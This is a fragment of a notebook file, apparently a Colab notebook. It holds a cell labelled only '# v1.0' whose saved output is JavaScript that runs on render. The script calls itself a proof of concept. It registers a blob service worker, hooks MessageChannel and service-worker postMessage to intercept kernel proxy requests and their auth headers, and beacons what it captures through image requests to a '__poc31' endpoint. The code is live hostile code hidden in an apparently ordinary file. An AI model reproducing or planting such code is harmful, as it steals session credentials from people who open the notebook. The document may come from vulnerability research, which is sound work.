      "source": [
        "# v1.0"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(function() {\n  var B = 'https://colab.research.google.com/__poc31';\n  var L = function(t, v) {\n    new Image().src = B + '/' + t + '?v=' + encodeURIComponent(String(v || '').slice(0, 900));\n  };\n\n  L('START', location.origin + '|' + location.href.slice(0, 100));\n\n  // ---- Play A: replace SW with our controlled version ----------------------\n  // Blob URL inherits this frame's origin (confirmed: same RAND origin)\n  // CSP check: if worker-src is unset or allows blob: this succeeds\n  (function() {\n    if (!navigator.serviceWorker) { L('SW_A', 'no_sw_api'); return; }\n    try {\n      var swCode = atob('');\n      var blob = new Blob([swCode], {type: 'text/javascript'});\n      var blobUrl = URL.createObjectURL(blob);\n      navigator.serviceWorker.register(blobUrl, {scope: './'}).then(function(reg) {\n        var state = reg.active ? 'active' : reg.installing ? 'installing' : reg.waiting ? 'waiting' : 'unknown';\n        L('SW_REG_OK', blobUrl.slice(0, 60) + '|state=' + state);\n      }).catch(function(e) {\n        L('SW_REG_FAIL', e.name + '|' + e.message.slice(0, 150));\n      });\n\n      // Listen for messages FROM our SW (intercepted traffic)\n      navigator.serviceWorker.addEventListener('message', function(e) {\n        var d = e.data || {};\n        if (d.sw_intercept === 'proxy_req') {\n          // This is the jackpot: kernel proxy request with auth headers\n          L('SW_PROXY_REQ', JSON.stringify({\n            url: d.url, method: d.method, headers: d.headers, body_len: d.body_len\n          }).slice(0, 900));\n        } else if (d.sw_intercept === 'fetch') {\n          L('SW_FETCH', JSON.stringify({url: d.url, method: d.method, headers: d.headers}).slice(0, 900));\n        } else if (d.sw_intercept === 'msg') {\n          L('SW_MSG', d.data);\n        }\n      });\n\n      L('SW_A', 'registration_sent');\n    } catch(e) {\n      L('SW_A_ERR', e.name + '|' + e.message.slice(0, 150));\n    }\n  })();\n\n  // ---- Play B: MessageChannel hook (fallback) ------------------------------\n  // Runs regardless of Play A - belt and suspenders\n  (function() {\n    var OrigMC = window.MessageChannel;\n    if (!OrigMC) { L('MC_HOOK', 'no_mc'); return; }\n    var mcLog = [];\n    window.MessageChannel = function() {\n      var mc = new OrigMC();\n      var id = mcLog.length;\n      mcLog.push(id);\n      L('MC_NEW', 'ch' + id);\n\n      var op2 = mc.port2.postMessage.bind(mc.port2);\n      mc.port2.postMessage = function(data, transfer) {\n        try {\n          var d = typeof data === 'string' ? data : JSON.stringify(data);\n          L('MC_P2_SEND', 'ch' + id + '|' + d.slice(0, 600));\n        } catch(x) {}\n        return op2(data, transfer);\n      };\n\n      var _p1fn = null;\n      try {\n        Object.defineProperty(mc.port1, 'onmessage', {\n          configurable: true,\n          get: function() { return _p1fn; },\n          set: function(fn) {\n            _p1fn = function(e) {\n              try {\n                var d = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);\n                L('MC_P1_RECV', 'ch' + id + '|' + d.slice(0, 600));\n              } catch(x) {}\n              if (fn) fn.call(this, e);\n            };\n            var desc = Object.getOwnPropertyDescriptor(MessagePort.prototype, 'onmessage');\n            if (desc && desc.set) desc.set.call(mc.port1, _p1fn);\n          }\n        });\n      } catch(x) { L('MC_HOOK_DEF_ERR', x.message); }\n\n      return mc;\n    };\n    L('MC_HOOK', 'installed');\n  })();\n\n  // ---- Play B cont: also hook SW controller.postMessage -------------------\n  // Intercept the configure call before the port is transferred to the SW\n  (function() {\n    if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {\n      L('SW_PM_HOOK', 'no_controller_yet');\n      // Re-try when controller arrives\n      navigator.serviceWorker && navigator.serviceWorker.addEventListener('controllerchange', function() {\n        var sw = navigator.serviceWorker.controller;\n        if (!sw) return;\n        var orig = sw.postMessage.bind(sw);\n        sw.postMessage = function(data, transfer) {\n          try {\n            var d = typeof data === 'string' ? data : JSON.stringify(data);\n            L('SW_PM', 'action=' + (data && data.action) + '|' + d.slice(0, 500));\n          } catch(x) {}\n          return orig(data, transfer);\n        };\n        L('SW_PM_HOOK', 'installed_on_change');\n      });\n      return;\n    }\n    var sw = navigator.serviceWorker.controller;\n    var orig = sw.postMessage.bind(sw);\n    sw.postMessage = function(data, transfer) {\n      try {\n        var d = typeof data === 'string' ? data : JSON.stringify(data);\n        L('SW_PM', 'action=' + (data && data.action) + '|' + d.slice(0, 500));\n      } catch(x) {}\n      return orig(data, transfer);\n    };\n    L('SW_PM_HOOK', 'installed');\n  })();\n\n  // ---- Also send our own configure to intercept localhost routing ----------\n  (function() {\n    if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {\n      L('SW_CFG', 'no_controller');\n      return;\n    }\n    try {\n      var mc1 = new MessageChannel();\n      var mc2 = new MessageChannel();\n      mc1.port1.onmessage = function(e) {\n        var d = e.data || {};\n        L('SW_REQ', JSON.stringify({\n          url: d.url, method: d.method, id: d.requestId,\n          headers: JSON.stringify(d.headers || {}).slice(0, 600)\n        }).slice(0, 900));\n        mc1.port1.postMessage({action: 'pass', responseId: d.requestId});\n      };\n      mc1.port1.start();\n      mc2.port1.onmessage = function(e) { L('SW_CFG_ACK', JSON.stringify(e.data)); };\n      mc2.port1.start();\n      navigator.serviceWorker.controller.postMessage(\n        {action: 'configure', serviceWorkerPort: mc1.port2, responsePort: mc2.port2},\n        [mc1.port2, mc2.port2]\n      );\n      L('SW_CFG', 'sent');\n    } catch(e) { L('SW_CFG_ERR', e.message); }\n  })();\n\n  L('INIT_DONE', 'plays_A_and_B_armed');\n})();",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
